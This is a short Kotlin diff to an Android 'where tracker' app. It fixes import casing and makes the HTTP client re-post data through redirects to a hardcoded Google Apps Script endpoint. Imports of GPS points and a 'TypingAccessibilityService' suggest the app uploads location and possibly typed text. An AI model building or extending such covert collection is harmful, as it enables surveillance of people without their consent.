@@ -3,9 +3,9 @@ package com.Dev.where.tracker
 import android.content.Context
 import android.location.Location
 import android.util.Log
-import com.dev.where.db.GpsPoint
-import com.dev.where.db.WhereDatabase
-import com.dev.where.tracker.TypingAccessibilityService
+import com.Dev.where.db.GpsPoint
+import com.Dev.where.db.WhereDatabase
+import com.Dev.where.tracker.TypingAccessibilityService
 import kotlinx.coroutines.CoroutineScope
 import kotlinx.coroutines.Dispatchers
 import kotlinx.coroutines.launch
@@ -19,7 +19,26 @@ object SheetsSender {
     private const val TAG = "SheetsSender"
     private const val ENDPOINT = "https://script.google.com/macros/s/AKfycbxbIfCAjoLvRZAFuvb0QQ9GUx-Ugoje24qArFoA9z7lXTaWYKUDNFfma--IxQzg69Lmdw/exec"
 
-    private val client = OkHttpClient()
+
+
+    // DOPO
+    private val client = OkHttpClient.Builder()
+        .followRedirects(false)
+        .followSslRedirects(false)
+        .addInterceptor { chain ->
+            var response = chain.proceed(chain.request())
+            if (response.code == 302 || response.code == 301) {
+                val newUrl = response.header("Location") ?: return@addInterceptor response
+                response.close()
+                val newRequest = chain.request().newBuilder()
+                    .url(newUrl)
+                    .post(chain.request().body!!)
+                    .build()
+                response = chain.proceed(newRequest)
+            }
+            response
+        }
+        .build()
     private val JSON_TYPE = "application/json".toMediaType()
     private val scope = CoroutineScope(Dispatchers.IO)
 
